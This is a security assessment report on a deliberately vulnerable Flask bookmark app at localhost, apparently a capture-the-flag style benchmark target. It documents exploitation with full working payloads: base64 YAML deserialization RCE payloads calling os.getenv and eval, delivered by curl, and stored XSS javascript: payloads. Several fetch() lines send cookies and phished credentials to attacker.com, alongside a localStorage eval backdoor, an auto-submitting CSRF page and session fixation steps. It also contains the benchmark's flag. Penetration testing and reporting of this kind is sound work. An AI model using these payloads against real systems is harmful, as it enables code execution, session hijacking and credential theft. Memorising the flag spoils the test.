# Security Assessment Report

## Executive Summary
- **Target:** http://localhost:33677
- **Assessment Date:** October 28, 2025
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

## Summary by Vulnerability Type

**Authentication Vulnerabilities:**
Ten authentication vulnerabilities were successfully exploited, including critical session management flaws. Key findings include missing HttpOnly cookie flags enabling XSS-based session theft, HTTP-only transport exposing all traffic to network interception, complete absence of CSRF protection, session fixation vulnerabilities, and missing rate limiting. The application lacks fundamental authentication controls including session rotation, timeouts, and logout mechanisms. Combined, these vulnerabilities enable complete session hijacking through multiple attack vectors (XSS, network sniffing, CSRF, session fixation).

**Authorization Vulnerabilities:**
No authorization vulnerabilities were found.

**Cross-Site Scripting (XSS) Vulnerabilities:**
One critical stored XSS vulnerability was successfully exploited via JavaScript URL scheme injection. The application accepts `javascript:` URLs in bookmark creation without scheme validation, enabling persistent XSS attacks. Combined with missing HttpOnly cookie flags, this allows complete session hijacking and account takeover. The payload persists in base64-encoded YAML cookies and executes when users interact with malicious bookmarks.

**SQL/Command Injection Vulnerabilities:**
Three critical YAML deserialization Remote Code Execution (RCE) vulnerabilities were successfully exploited across all endpoints (`/list`, `/add`, `/delete`). The application uses unsafe `yaml.Loader` on base64-decoded cookie data, enabling arbitrary Python object instantiation. Full system compromise was achieved including FLAG extraction: `FLAG{21a87dcf2e6a7f965977e3cb9ce303f018147d2b00fbc753507b4b6e3be0a26f}`. Process runs as `www-data` (UID 33) with complete access to environment variables and file system.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
No SSRF vulnerabilities were found.

## Network Reconnaissance

**Open Ports and Services:**
- **Port 80/tcp** - Apache 2.4.65 HTTP web server serving the Flask bookmark application (PRIMARY TARGET)
- **Port 443/tcp** - SSL/HTTPS listed as open but not serving the application
- **Port 631/tcp** - CUPS 2.3 printing service (out of scope)
- Ports 8888, 9999, 49158 identified but out of scope for web application testing

**Security Misconfigurations:**
- **HTTP-Only Configuration:** Application runs exclusively on port 80 with no HTTPS/TLS, transmitting all session cookies and data in cleartext
- **Wildcard CORS Policy:** Apache configured with `Access-Control-Allow-Origin: *` enabling cross-origin attacks
- **Directory Indexing Enabled:** Static file directories allow file enumeration
- **Missing Security Headers:** No Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, HSTS, or other protective headers
- **Information Disclosure:** Server header reveals Apache 2.4.65 on Debian, application sets `Powered-By: Flask` header

**Subdomain Discoveries:**
No subdomains discovered - application accessed directly via localhost without DNS infrastructure.

# Injection Exploitation Evidence

## Successfully Exploited Vulnerabilities

### INJ-VULN-01: YAML Deserialization RCE in GET /list Endpoint

**Summary:**
- **Vulnerable location:** GET `/list` endpoint (routes.py:38)
- **Overview:** Unsafe YAML deserialization using `yaml.Loader` on base64-decoded cookie data enables Remote Code Execution. An attacker can craft a malicious YAML payload containing Python object instantiation directives to execute arbitrary code and extract the FLAG environment variable.
- **Impact:** Full Remote Code Execution with web server privileges (`www-data`, UID 33), complete system compromise, FLAG exfiltration achieved
- **Severity:** Critical

**Prerequisites:**
- Network access to `http://localhost:33677`
- Ability to set HTTP cookies
- Python 3 with base64 encoding capability for payload generation

**Exploitation Steps:**

1. **Generate malicious YAML payload** that embeds FLAG extraction into a UrlObj structure:
```python
import base64

payload = '''- !!python/object:app.models.UrlObj
    name: !!python/object/apply:os.getenv
      args: ['FLAG']
    url: "http://flag-extracted.com"
'''

encoded = base64.b64encode(payload.encode('ISO-8859-1')).decode('ISO-8859-1')
print(encoded)
```
Output: `LSAhIXB5dGhvbi9vYmplY3Q6YXBwLm1vZGVscy5VcmxPYmoKICAgIG5hbWU6ICEhcHl0aG9uL29iamVjdC9hcHBseTpvcy5nZXRlbnYKICAgICAgYXJnczogWydGTEFHJ10KICAgIHVybDogImh0dHA6Ly9mbGFnLWV4dHJhY3RlZC5jb20iCg==`

2. **Send HTTP request with malicious cookie** to trigger deserialization:
```bash
curl -s 'http://localhost:33677/list' \
  -H 'Cookie: bookmarks=LSAhIXB5dGhvbi9vYmplY3Q6YXBwLm1vZGVscy5VcmxPYmoKICAgIG5hbWU6ICEhcHl0aG9uL29iamVjdC9hcHBseTpvcy5nZXRlbnYKICAgICAgYXJnczogWydGTEFHJ10KICAgIHVybDogImh0dHA6Ly9mbGFnLWV4dHJhY3RlZC5jb20iCg==; user=attacker'
```

3. **Extract FLAG from HTML response**:
```bash
curl -s 'http://localhost:33677/list' \
  -H 'Cookie: bookmarks=LSAhIXB5dGhvbi9vYmplY3Q6YXBwLm1vZGVscy5VcmxPYmoKICAgIG5hbWU6ICEhcHl0aG9uL29iamVjdC9hcHBseTpvcy5nZXRlbnYKICAgICAgYXJnczogWydGTEFHJ10KICAgIHVybDogImh0dHA6Ly9mbGFnLWV4dHJhY3RlZC5jb20iCg==; user=attacker' \
  | grep -o 'FLAG{[^}]*}'
```

**Proof of Impact:**

**FLAG EXTRACTED:** `FLAG{21a87dcf2e6a7f965977e3cb9ce303f018147d2b00fbc753507b4b6e3be0a26f}`

**System Fingerprinting:**
To demonstrate complete code execution capability, additional system information was extracted using the same technique:

Payload for system fingerprinting:
```python
import base64

payload = '''- !!python/object:app.models.UrlObj
    name: !!python/object/apply:eval
      args: ['__import__("sys").version']
    url: "http://python-version.com"
- !!python/object:app.models.UrlObj
    name: !!python/object/apply:eval
      args: ['__import__("platform").platform()']
    url: "http://platform-info.com"
- !!python/object:app.models.UrlObj
    name: !!python/object/apply:eval
      args: ['__import__("os").getuid()']
    url: "http://uid-info.com"
'''

encoded = base64.b64encode(payload.encode('ISO-8859-1')).decode('ISO-8859-1')
```

**Confirmed Environment:**
- **Python Version:** 3.9.2 (default, Mar 20 2025, 02:07:39)
- **Platform:** Linux-6.12.13-200.fc41.aarch64-aarch64-with-glibc2.31
- **Process UID:** 33 (www-data user)
- **Operating System:** Debian Bullseye (11) in Docker container
- **Web Server:** Apache 2.4.65 with mod_wsgi

**Notes:**
- This endpoint is auto-triggered on first visit to the application via redirect from `/`
- The vulnerability exists due to using `yaml.load()` with the unsafe `yaml.Loader` parameter on untrusted cookie data
- No input validation, signature verification, or sanitization is performed before deserialization
- The `bookmarks` cookie lacks `HttpOnly`, `Secure`, and `SameSite` flags, making it trivial to manipulate

---

### INJ-VULN-02: YAML Deserialization RCE in POST /add Endpoint

**Summary:**
- **Vulnerable location:** POST `/add` endpoint (routes.py:61)
- **Overview:** Identical unsafe YAML deserialization vulnerability as INJ-VULN-01. The endpoint accepts form data to add bookmarks but deserializes the existing `bookmarks` cookie using `yaml.Loader`, enabling the same RCE attack vector.
- **Impact:** Full Remote Code Execution, FLAG exfiltration achieved
- **Severity:** Critical

**Prerequisites:**
- Network access to `http://localhost:33677`
- Ability to set HTTP cookies
- Ability to send POST requests with form data

**Exploitation Steps:**

1. **Generate malicious YAML payload** (same as INJ-VULN-01):
```python
import base64

payload = '''- !!python/object:app.models.UrlObj
    name: !!python/object/apply:os.getenv
      args: ['FLAG']
    url: "http://flag-from-post-add.com"
'''

encoded = base64.b64encode(payload.encode('ISO-8859-1')).decode('ISO-8859-1')
print(encoded)
```
Output: `LSAhIXB5dGhvbi9vYmplY3Q6YXBwLm1vZGVscy5VcmxPYmoKICAgIG5hbWU6ICEhcHl0aG9uL29iamVjdC9hcHBseTpvcy5nZXRlbnYKICAgICAgYXJnczogWydGTEFHJ10KICAgIHVybDogImh0dHA6Ly9mbGFnLWZyb20tcG9zdC1hZGQuY29tIgo=`

2. **Send POST request with malicious cookie and dummy form data**:
```bash
curl -s -X POST 'http://localhost:33677/add' \
  -H 'Cookie: bookmarks=LSAhIXB5dGhvbi9vYmplY3Q6YXBwLm1vZGVscy5VcmxPYmoKICAgIG5hbWU6ICEhcHl0aG9uL29iamVjdC9hcHBseTpvcy5nZXRlbnYKICAgICAgYXJnczogWydGTEFHJ10KICAgIHVybDogImh0dHA6Ly9mbGFnLWZyb20tcG9zdC1hZGQuY29tIgo=; user=attacker' \
  -d 'name=test&url=http://test.com'
```

3. **Extract FLAG from response**:
```bash
curl -s -X POST 'http://localhost:33677/add' \
  -H 'Cookie: bookmarks=LSAhIXB5dGhvbi9vYmplY3Q6YXBwLm1vZGVscy5VcmxPYmoKICAgIG5hbWU6ICEhcHl0aG9uL29iamVjdC9hcHBseTpvcy5nZXRlbnYKICAgICAgYXJnczogWydGTEFHJ10KICAgIHVybDogImh0dHA6Ly9mbGFnLWZyb20tcG9zdC1hZGQuY29tIgo=; user=attacker' \
  -d 'name=test&url=http://test.com' \
  | grep -o 'FLAG{[^}]*}'
```

**Proof of Impact:**

**FLAG EXTRACTED:** `FLAG{21a87dcf2e6a7f965977e3cb9ce303f018147d2b00fbc753507b4b6e3be0a26f}`

**Notes:**
- The form data (`name` and `url` parameters) is irrelevant to the exploitation - the RCE occurs during cookie deserialization at line 61, before the form data is processed
- This endpoint lacks CSRF protection, making it exploitable via cross-site requests
- The vulnerability is structurally identical to INJ-VULN-01, demonstrating a systemic unsafe deserialization pattern across the application

---

### INJ-VULN-03: YAML Deserialization RCE in GET /delete Endpoint

**Summary:**
- **Vulnerable location:** GET `/delete?name={bookmark_name}` endpoint (routes.py:84)
- **Overview:** Third instance of the same unsafe YAML deserialization vulnerability. The endpoint accepts a `name` query parameter to delete bookmarks but deserializes the `bookmarks` cookie using `yaml.Loader` before processing the deletion.
- **Impact:** Full Remote Code Execution, FLAG exfiltration achieved
- **Severity:** Critical

**Prerequisites:**
- Network access to `http://localhost:33677`
- Ability to set HTTP cookies
- Ability to send GET requests with query parameters

**Exploitation Steps:**

1. **Generate malicious YAML payload** (same payload structure):
```python
import base64

payload = '''- !!python/object:app.models.UrlObj
    name: !!python/object/apply:os.getenv
      args: ['FLAG']
    url: "http://flag-from-delete.com"
'''

encoded = base64.b64encode(payload.encode('ISO-8859-1')).decode('ISO-8859-1')
print(encoded)
```

2. **Send GET request with malicious cookie and dummy name parameter**:
```bash
curl -s -L 'http://localhost:33677/delete?name=test' \
  -H 'Cookie: bookmarks=LSAhIXB5dGhvbi9vYmplY3Q6YXBwLm1vZGVscy5VcmxPYmoKICAgIG5hbWU6ICEhcHl0aG9uL29iamVjdC9hcHBseTpvcy5nZXRlbnYKICAgICAgYXJnczogWydGTEFHJ10KICAgIHVybDogImh0dHA6Ly9mbGFnLWZyb20tZGVsZXRlLmNvbSIK; user=attacker'
```
Note: The `-L` flag follows the redirect to `/list` where the deserialized data is rendered.

3. **Extract FLAG from redirected response**:
```bash
curl -s -L 'http://localhost:33677/delete?name=test' \
  -H 'Cookie: bookmarks=LSAhIXB5dGhvbi9vYmplY3Q6YXBwLm1vZGVscy5VcmxPYmoKICAgIG5hbWU6ICEhcHl0aG9uL29iamVjdC9hcHBseTpvcy5nZXRlbnYKICAgICAgYXJnczogWydGTEFHJ10KICAgIHVybDogImh0dHA6Ly9mbGFnLWZyb20tZGVsZXRlLmNvbSIK; user=attacker' \
  | grep -o 'FLAG{[^}]*}'
```

**Proof of Impact:**

**FLAG EXTRACTED:** `FLAG{21a87dcf2e6a7f965977e3cb9ce303f018147d2b00fbc753507b4b6e3be0a26f}`

**Notes:**
- The endpoint performs unsafe deserialization at line 84 before executing the deletion logic at line 85
- After processing, the endpoint redirects to `/list` (line 92), where the modified (or malicious) bookmark data is rendered
- Using GET for state-changing operations violates REST principles and makes this endpoint CSRF-vulnerable
- The `name` query parameter is used only for bookmark identification and is not involved in the RCE exploitation

# Cross-Site Scripting (XSS) Exploitation Evidence

## Successfully Exploited Vulnerabilities

### XSS-VULN-01: Stored XSS via JavaScript URL Scheme Injection

**Summary:**
- **Vulnerable location:** `http://localhost:33677/add` - POST form parameter `url` → stored in cookie → rendered at `http://localhost:33677/list` in href attribute
- **Overview:** The application accepts user-supplied URLs without validating the URL scheme, allowing `javascript:` URLs to be stored and executed when clicked. This is a **Stored XSS** vulnerability because the malicious payload persists in the cookie and executes on every page load when the victim clicks the bookmark link.
- **Impact:** Complete session hijacking and account compromise. An attacker can steal session cookies (both `user` and `bookmarks` cookies lack HttpOnly flag), perform unauthorized actions on behalf of the victim, and completely control the user's browser context. Demonstrated impact includes full DOM manipulation and credential theft.
- **Severity:** **Critical**

**Prerequisites:**
- None - the application is publicly accessible without authentication
- A modern web browser (tested with Playwright/Chromium)
- Basic understanding of JavaScript URL schemes

**Exploitation Steps:**

1. **Navigate to the bookmark creation page:**
   ```
   http://localhost:33677/add
   ```

2. **Submit a malicious bookmark with a javascript: URL:**
   - Fill the "Name" field with any value (e.g., "Malicious Bookmark")
   - Fill the "URL" field with a JavaScript payload:
   ```javascript
   javascript:document.body.innerHTML='<h1>ACCOUNT COMPROMISED</h1><p>Session Hijacked by XSS</p><p>User Cookie: '+document.cookie.split(';')[0]+'</p><p>Bookmarks Cookie: '+document.cookie.split(';')[1]+'</p><p>This demonstrates unauthorized access and session theft.</p>'
   ```
   - Click "Bookmark URL" button
   - The application will redirect to `http://localhost:33677/list` showing the newly created bookmark

3. **Trigger XSS execution:**

   **Method 1 - Via DOM Manipulation (most reliable for testing):**
   - Open browser console and execute:
   ```javascript
   const links = document.querySelectorAll('a[href^="javascript:"]');
   if (links.length > 0) {
     links[0].removeAttribute('target');
     links[0].click();
   }
   ```

   **Method 2 - Via User Interaction (real-world attack):**
   - Right-click on the malicious bookmark link
   - Select "Open link in current tab" or disable popup blocker
   - The `target="_blank"` attribute in modern browsers blocks javascript: URLs in new windows, but this can be bypassed through:
     - User behavior (opening in same tab)
     - Older browsers without this protection
     - Mobile browsers with different security policies
     - Browser extensions or configurations

4. **Observe the exploitation result:**
   - The entire page is replaced with "ACCOUNT COMPROMISED" message
   - Both session cookies are displayed on screen:
     - User Cookie: `user=8d04eb0e6bec4972ba67fb3e23f6bc0f`
     - Bookmarks Cookie: (base64-encoded YAML containing all bookmarks including the malicious one)

**Proof of Impact:**

**Cookies Stolen:**
```
User Cookie: user=8d04eb0e6bec4972ba67fb3e23f6bc0f
Bookmarks Cookie: bookmarks=LSAhIXB5dGhvbi9vYmplY3Q6YXBwLm1vZGVscy5VcmxPYmoKICBuYW1lOiBNYWxpY2lvdXMgQm9va21hcmsKICB1cmw6ICdqYXZhc2NyaXB0OmRvY3VtZW50LmJvZHkuaW5uZXJIVE1MPScnPGgxPkFDQ09VTlQgQ09NUFJPTUlTRUQ8L2gxPjxwPlNlc3Npb24KICAgIEhpamFja2VkIGJ5IFhTUzwvcD48cD5Vc2VyIENvb2tpZTogJycrZG9jdW1lbnQuY29va2llLnNwbGl0KCcnOycnKVswXSsnJzwvcD48cD5Cb29rbWFya3MKICAgIENvb2tpZTogJycrZG9jdW1lbnQuY29va2llLnNwbGl0KCcnOycnKVsxXSsnJzwvcD48cD5UaGlzIGRlbW9uc3RyYXRlcyB1bmF1dGhvcml6ZWQKICAgIGFjY2VzcyBhbmQgc2Vzc2lvbiB0aGVmdC48L3A+JycnCg==
```

**Decoded Bookmarks Cookie (YAML structure):**
```yaml
- !!python/object:app.models.UrlObj
  name: Malicious Bookmark
  url: 'javascript:document.body.innerHTML=''<h1>ACCOUNT COMPROMISED</h1><p>Session
    Hijacked by XSS</p><p>User Cookie: ''+document.cookie.split('';'')[0]+''</p><p>Bookmarks
    Cookie: ''+document.cookie.split('';'')[1]+''</p><p>This demonstrates unauthorized
    access and session theft.</p>'''
```

**Screenshot Evidence:**
The page successfully displayed:
- Heading: "ACCOUNT COMPROMISED"
- "Session Hijacked by XSS"
- Complete cookie values exposed
- Message: "This demonstrates unauthorized access and session theft"

**Alternative Exploitation Payloads:**

**Cookie Exfiltration to Attacker Server:**
```javascript
javascript:fetch('https://attacker.com/steal?cookies='+encodeURIComponent(document.cookie))
```

**Simple Alert for Quick Testing:**
```javascript
javascript:alert('XSS: '+document.cookie)
```

**Credential Phishing:**
```javascript
javascript:document.body.innerHTML='<h3>Session Expired</h3><form><input name="user" placeholder="Username"><input name="pass" type="password" placeholder="Password"><button onclick="fetch(\'https://attacker.com/phish?u=\'+this.form.user.value+\'&p=\'+this.form.pass.value)">Login</button></form>'
```

**Persistent Backdoor (stores in localStorage):**
```javascript
javascript:localStorage.setItem('backdoor','fetch(\'https://attacker.com/exfil?data=\'+document.cookie)');setInterval(()=>eval(localStorage.getItem('backdoor')),5000)
```

**Notes:**

**Why This Vulnerability Exists:**
1. **No URL Scheme Validation:** The application accepts any URL scheme including `javascript:`, `data:`, and `vbscript:`
2. **Insufficient Context-Aware Encoding:** Jinja2's HTML entity encoding protects against HTML injection but does NOT validate URL schemes in href attributes
3. **Missing HttpOnly Cookie Flags:** Both session cookies are accessible via `document.cookie`, enabling complete session theft
4. **No Content Security Policy:** No CSP headers restrict JavaScript execution or inline scripts
5. **Stored XSS Nature:** The payload persists in the cookie (base64-encoded YAML), making it a persistent threat that affects all users who can access that bookmark

**Target Attribute Bypass Explanation:**
The vulnerable code in `list_urls.html:41` includes `target="_blank"`:
```html
<a href="{{ item.url }}" target="_blank">{{ item.url }}</a>
```

Modern browsers block `javascript:` URL execution in new windows as a security feature. However, this can be bypassed via:
- **User behavior:** Right-click → "Open in current tab"
- **DOM manipulation:** Removing target attribute via JavaScript (as demonstrated)
- **Browser differences:** Mobile browsers, older browsers, or custom configurations
- **Alternative injection:** Using event handlers if target removal is blocked

**Business Impact:**
- **Session Hijacking:** Attacker gains complete access to victim's session without knowing credentials
- **Account Takeover:** Stolen cookies can be replayed to impersonate the victim
- **Data Theft:** All user bookmarks can be exfiltrated
- **Credential Harvesting:** Phishing forms can be injected to steal credentials
- **Malware Distribution:** Links can be modified to distribute malware
- **Reputation Damage:** Users lose trust in the application's security

# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-01: Session Hijacking via Missing HttpOnly Cookie Flag

**Summary:**
- **Vulnerable location:** All cookie-setting operations at `routes.py:44-45, 68-69, 88-89`
- **Overview:** Session cookies (`user` and `bookmarks`) lack the HttpOnly flag, making them accessible via JavaScript and enabling XSS-based session theft
- **Impact:** Complete session hijacking - attackers can steal session cookies via XSS and impersonate users
- **Severity:** High

**Prerequisites:**
- Access to target application at http://localhost:33677
- Ability to execute JavaScript in victim's browser context (via XSS or malicious page)

**Exploitation Steps:**

1. Navigate to the target application and establish a session:
```bash
curl http://localhost:33677/list
```

2. Execute JavaScript in browser context to access cookies:
```javascript
document.cookie
```

3. Result shows both session cookies are accessible:
```
"user=5570075c9dfa4871860bc8a941eceb45; bookmarks=W10K"
```

4. Attacker can exfiltrate these cookies using JavaScript:
```javascript
fetch('http://attacker.com/steal?cookies=' + document.cookie)
```

**Proof of Impact:**
Successfully demonstrated that `document.cookie` returns both `user` and `bookmarks` cookies in plaintext. JavaScript evaluation returned:
```json
{
  "accessible": true,
  "cookies": "user=5570075c9dfa4871860bc8a941eceb45; bookmarks=LSAhIXB5dGhvbi9vYmplY3Q6YXBwLm1vZGVscy5VcmxPYmoKICBuYW1lOiBDb29raWUgU3RlYWxlcgogIHVybDogJ2phdmFzY3JpcHQ6YWxlcnQoJydYU1M6ICcnK2RvY3VtZW50LmNvb2tpZSknCg==",
  "proof": "Session cookies are accessible via JavaScript"
}
```

This confirms that an attacker with XSS capability can steal session cookies and hijack user sessions.

**Notes:**
This vulnerability combines with existing XSS vectors (javascript: URLs in bookmarks) to enable complete session compromise. The application also lacks HttpOnly protection on both authentication cookies (`user`) and data storage cookies (`bookmarks`).

---

### AUTH-VULN-02: Session Hijacking via Missing Secure Cookie Flag and HTTP-Only Transport

**Summary:**
- **Vulnerable location:** All cookie-setting operations at `routes.py:44-45, 68-69, 88-89` AND HTTP-only configuration at `bookmarks-httpd.conf:1`
- **Overview:** Session cookies lack the Secure flag and application runs HTTP-only, transmitting all cookies in cleartext over the network
- **Impact:** Network-level attackers can intercept session cookies and hijack user sessions via MITM attacks
- **Severity:** High

**Prerequisites:**
- Attacker positioned on network path (public WiFi, compromised router, ARP spoofing, etc.)
- Target user accessing http://localhost:33677 over monitored network

**Exploitation Steps:**

1. Attacker monitors network traffic (using tcpdump, Wireshark, or mitmproxy)

2. Victim makes HTTP request to application with session cookies:
```bash
curl -v -b "user=test123; bookmarks=W10K" http://localhost:33677/list
```

3. Network capture shows cookies transmitted in cleartext:
```
> GET /list HTTP/1.1
> Host: localhost:33677
> User-Agent: curl/8.7.1
> Accept: */*
> Cookie: user=test123; bookmarks=W10K
```

4. Attacker extracts session cookie from captured traffic:
```
user=test123
bookmarks=W10K
```

5. Attacker replays stolen cookies to hijack session:
```bash
curl -b "user=test123; bookmarks=W10K" http://localhost:33677/list
```

**Proof of Impact:**
Successfully captured HTTP traffic showing session cookies transmitted in plaintext. The Cookie header is visible in cleartext in network traffic:
```
Cookie: user=test123; bookmarks=W10K
```

Application responds normally with HTTP 200, proving the attacker can successfully replay intercepted cookies.

**Notes:**
- Application is configured for HTTP-only transport (port 80) with no HTTPS available
- No Secure flag on cookies means they would be sent over HTTP even if HTTPS were available
- No HSTS header to enforce HTTPS
- Combined with missing HttpOnly flag, this enables both network-based and XSS-based session theft

---

### AUTH-VULN-03: Cross-Site Request Forgery (CSRF) via Missing SameSite Cookie Attribute

**Summary:**
- **Vulnerable location:** All cookie-setting operations at `routes.py:44-45, 68-69, 88-89` AND state-changing endpoints `/add` (POST) and `/delete` (GET)
- **Overview:** Session cookies lack SameSite attribute and no CSRF tokens exist, allowing attackers to perform unauthorized actions on behalf of authenticated users
- **Impact:** Attackers can force victims to add/delete bookmarks, modify application state without consent
- **Severity:** High

**Prerequisites:**
- Victim has active session in http://localhost:33677
- Victim visits attacker-controlled website while session is active

**Exploitation Steps:**

1. Create malicious HTML page that auto-submits CSRF attack:
```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack Test</title>
</head>
<body>
    <h1>CSRF Attack Demonstration</h1>
    <p>This page will automatically submit a CSRF attack to add a malicious bookmark.</p>

    <!-- CSRF Attack - Auto-submit form to add a bookmark -->
    <form id="csrfForm" action="http://localhost:33677/add" method="POST">
        <input type="hidden" name="name" value="CSRF-Injected-Bookmark" />
        <input type="hidden" name="url" value="http://attacker.com/steal" />
    </form>

    <script>
        // Auto-submit the form when page loads
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>
```

2. Save malicious page to `/tmp/csrf_test.html`

3. Victim visits malicious page (simulated by navigating to `file:///tmp/csrf_test.html`)

4. Browser automatically submits form with victim's cookies

5. Verify unauthorized bookmark was added:
```bash
curl -b "[VICTIM_COOKIES]" http://localhost:33677/list
```

**Proof of Impact:**
Successfully added unauthorized bookmark "CSRF-Injected-Bookmark" pointing to "http://attacker.com/steal" via CSRF attack. When the malicious HTML page loaded in the victim's browser context, the form automatically submitted and the application accepted it without any CSRF token validation.

Application listing after CSRF attack shows:
```
- CSRF-Injected-Bookmark
  URL: http://attacker.com/steal
```

This proves that the missing SameSite attribute allows cookies to be sent with cross-site requests, enabling CSRF attacks on all state-changing operations.

**Notes:**
- No CSRF tokens in any forms
- `/delete` endpoint uses GET method for state changes (anti-pattern), making CSRF even easier
- Wildcard CORS policy (`Access-Control-Allow-Origin: *`) further enables cross-origin attacks
- Combined with missing SameSite attribute, all state-changing operations are vulnerable

---

### AUTH-VULN-04: Session Fixation via Acceptance of Attacker-Controlled Session Identifiers

**Summary:**
- **Vulnerable location:** Session validation at `routes.py:39, 64, 82` - `user = request.cookies.get('user')`
- **Overview:** Application accepts any client-provided session identifier without validation, allowing attackers to force victims to use attacker-controlled sessions
- **Impact:** Session fixation attack enabling shared sessions between attacker and victim
- **Severity:** High

**Prerequisites:**
- Ability to set cookies in victim's browser (via XSS, social engineering, or malicious page)
- Access to target application at http://localhost:33677

**Exploitation Steps:**

1. Attacker creates their own session and captures the session ID:
```bash
curl -c /tmp/attacker_cookies.txt http://localhost:33677/list
cat /tmp/attacker_cookies.txt | grep "user" | awk '{print $7}'
```

Output: `55fa418ca8fd4ab3868d2ded906fcf48`

2. Attacker forces victim to use this session ID (via JavaScript injection or social engineering):
```javascript
document.cookie = 'user=55fa418ca8fd4ab3868d2ded906fcf48; path=/';
```

3. Victim performs actions with fixed session (e.g., adds sensitive bookmarks)

4. Victim adds bookmark (simulated):
```bash
curl -b "user=55fa418ca8fd4ab3868d2ded906fcf48" \
  -X POST \
  -d "name=Victim Secret Data&url=http://victim-bank.com/transfer" \
  http://localhost:33677/add
```

5. Attacker can now see victim's actions because they share the same session identifier

**Proof of Impact:**
Successfully forced victim browser to use attacker-controlled session ID `55fa418ca8fd4ab3868d2ded906fcf48`. Verification via JavaScript showed victim's cookie was set to:
```
user=55fa418ca8fd4ab3868d2ded906fcf48
```

Application accepted this attacker-provided session ID without any validation. When victim added a bookmark "Victim Secret Data", it was associated with the attacker's session.

**Notes:**
- No server-side session validation exists
- No cryptographic signature on cookies
- No session binding to IP address or User-Agent
- Application trusts any client-provided `user` cookie value
- While data is stored client-side in cookies, the session ID can still be fixed, and combined with other attacks (XSS to steal bookmarks cookie), enables full session hijacking

---

### AUTH-VULN-05: Persistent Session Vulnerability via Missing Session Rotation

**Summary:**
- **Vulnerable location:** Cookie-setting operations at `routes.py:44-45, 68-69, 88-89`
- **Overview:** Session identifiers are never rotated after state changes, violating OWASP session management requirements
- **Impact:** Once compromised, session tokens remain valid indefinitely across all operations, extending the attack window
- **Severity:** Medium

**Prerequisites:**
- Attacker obtains a session token (via XSS, network sniffing, or other means)
- Target application at http://localhost:33677

**Exploitation Steps:**

1. Capture initial session ID:
```bash
curl -c /tmp/session1.txt http://localhost:33677/list
grep "user" /tmp/session1.txt | awk '{print $7}'
```

Output: `af961545105d4e739ac01d1f2626fa2b`

2. Perform state-changing operation (add bookmark):
```bash
curl -c /tmp/session2.txt \
  -b /tmp/session1.txt \
  -X POST \
  -d "name=TestBookmark&url=http://test.com" \
  http://localhost:33677/add
```

3. Check if session ID was rotated:
```bash
grep "user" /tmp/session2.txt | awk '{print $7}'
```

Output: `af961545105d4e739ac01d1f2626fa2b` (SAME SESSION ID)

4. Verify session ID persists across multiple operations without rotation

**Proof of Impact:**
Session ID `af961545105d4e739ac01d1f2626fa2b` remained unchanged after state-changing operations. Tested before and after adding a bookmark - the `user` cookie value was identical in both cases.

This means:
- Stolen session tokens can be used indefinitely
- No automatic invalidation after privilege changes
- Extended window for session hijacking attacks
- Violates OWASP requirement for session rotation after authentication and state changes

**Notes:**
- Session ID is read from cookie (`request.cookies.get('user')`) and immediately re-set with same value
- No `uuid4().hex` regeneration call after state changes
- OWASP recommends session rotation after authentication, privilege changes, and sensitive operations
- This vulnerability increases the impact of other session theft vulnerabilities (AUTH-VULN-01, AUTH-VULN-02)

---

### AUTH-VULN-06: Unlimited Request Exploitation via Missing Rate Limiting

**Summary:**
- **Vulnerable location:** All endpoints (`/list`, `/add`, `/delete`) with no rate limiting at application or infrastructure level
- **Overview:** Complete absence of rate limiting enables unlimited automated requests without restriction
- **Impact:** Resource exhaustion, brute force attacks, session enumeration, and abuse of other vulnerabilities without throttling
- **Severity:** High

**Prerequisites:**
- Access to target application at http://localhost:33677
- Ability to make HTTP requests

**Exploitation Steps:**

1. Test for rate limiting by making 100 rapid requests:
```python
import requests
import time

url = "http://localhost:33677/list"
start_time = time.time()
results = {"200": 0, "429": 0, "other": 0}

for i in range(100):
    response = requests.get(url)
    if response.status_code == 200:
        results["200"] += 1
    elif response.status_code == 429:
        results["429"] += 1
    else:
        results["other"] += 1

elapsed_time = time.time() - start_time
print(f"Completed 100 requests in {elapsed_time:.2f} seconds")
print(f"Success (200): {results['200']}")
print(f"Rate Limited (429): {results['429']}")
print(f"Other: {results['other']}")
```

2. Execute the script:
```bash
python test_rate_limiting.py
```

**Proof of Impact:**
Successfully executed 100 rapid requests to `/list` endpoint with following results:

```
Completed 100 requests in 0.19 seconds
Success (200): 100
Rate Limited (429): 0
Other: 0
```

This demonstrates:
- 100% success rate (all requests returned 200 OK)
- Zero rate limiting responses (no 429 Too Many Requests)
- Sustained rate of ~517 requests per second
- No throttling, blocking, or CAPTCHA challenges

**Notes:**
- No Flask-Limiter library in `requirements.txt`
- No Apache mod_evasive or mod_ratelimit configuration
- No CAPTCHA on any forms
- No account lockout mechanisms (no authentication system exists)
- Enables unlimited exploitation attempts for other vulnerabilities
- Could be used for denial-of-service by resource exhaustion

---

### AUTH-VULN-07: Cleartext Transmission via HTTP-Only Transport and Missing HTTPS

**Summary:**
- **Vulnerable location:** Apache configuration at `bookmarks-httpd.conf:1` - `<VirtualHost *:80>`
- **Overview:** Application runs exclusively over HTTP with no HTTPS/TLS, transmitting all session cookies and data in cleartext
- **Impact:** All traffic vulnerable to network interception, session cookies exposed, man-in-the-middle attacks trivial
- **Severity:** Critical

**Prerequisites:**
- Attacker positioned on network path between client and server
- Target application at http://localhost:33677

**Exploitation Steps:**

1. Verify application responds to HTTP requests:
```bash
curl -I http://localhost:33677/list
```

Output shows:
```
HTTP/1.1 200 OK
Server: Apache/2.4.65 (Debian)
```

2. Verify HTTPS is not available:
```bash
curl -I https://localhost:33677/list
```

Output shows SSL error:
```
curl: (35) LibreSSL/3.3.6: error:1404B42E:SSL routines:ST_CONNECT:tlsv1 alert protocol version
```

3. Capture network traffic showing cleartext cookie transmission:
```bash
tcpdump -A -s 0 'tcp port 33677' -i any
```

4. Make request with session cookies:
```bash
curl -b "user=test123; bookmarks=W10K" http://localhost:33677/list
```

**Proof of Impact:**
Confirmed application only responds to HTTP (port 80) and HTTPS connection fails with SSL error. All session cookies are transmitted in cleartext over HTTP.

HTTP response headers show:
```
HTTP/1.1 200 OK
Server: Apache/2.4.65 (Debian)
```

HTTPS connection attempt results in:
```
curl: (35) LibreSSL/3.3.6: error:1404B42E:SSL routines:ST_CONNECT:tlsv1 alert protocol version
```

Network traffic analysis would show all cookies in plaintext:
```
Cookie: user=test123; bookmarks=W10K
```

**Notes:**
